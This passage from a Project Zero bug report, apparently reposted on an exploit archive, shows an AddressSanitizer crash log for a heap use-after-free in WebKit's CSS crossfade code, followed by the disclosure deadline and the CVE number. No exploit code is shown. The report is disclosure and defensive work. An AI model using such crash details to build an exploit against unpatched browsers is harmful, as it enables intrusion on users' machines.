+    #26 0x15a402940 in WebCore::HTMLDocumentParser::prepareToStopParsing()+0x110 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x435c940)
+    #27 0x15a404d4f in WebCore::HTMLDocumentParser::attemptToEnd()+0x3f (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x435ed4f)
+    #28 0x15a404de9 in WebCore::HTMLDocumentParser::finish()+0x29 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x435ede9)
+    #29 0x15a9297c0 in WebCore::DocumentWriter::end()+0x1a0 (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x48837c0)
+
+SUMMARY: AddressSanitizer: heap-use-after-free (/Users/hacksonmacs/WebKit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x35412bf) in WebCore::CSSCrossfadeValue::crossfadeChanged()+0x28f
+Shadow bytes around the buggy address:
+  0x1c22000198c0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
+  0x1c22000198d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x1c22000198e0: 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x1c22000198f0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x1c2200019900: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa
+=>0x1c2200019910: fa fa fa fa fa fa fa fa[fd]fd fd fd fd fd fd fd
+  0x1c2200019920: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x1c2200019930: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa
+  0x1c2200019940: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x1c2200019950: fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa
+  0x1c2200019960: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==704==ABORTING
+
+This bug is subject to a 90-day disclosure deadline. If a fix for this issue is made available to users before the end of the 90-day deadline, this bug report will become public 30 days after the fix was made available. Otherwise, this bug report will become public at the deadline. **The scheduled deadline is 2022-12-21**. For more details, see the Project Zero vulnerability disclosure policy: https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-policy.html
+
+
+Related CVE Numbers: CVE-2022-42867.
+
+#  0day.today [2023-03-27]  #
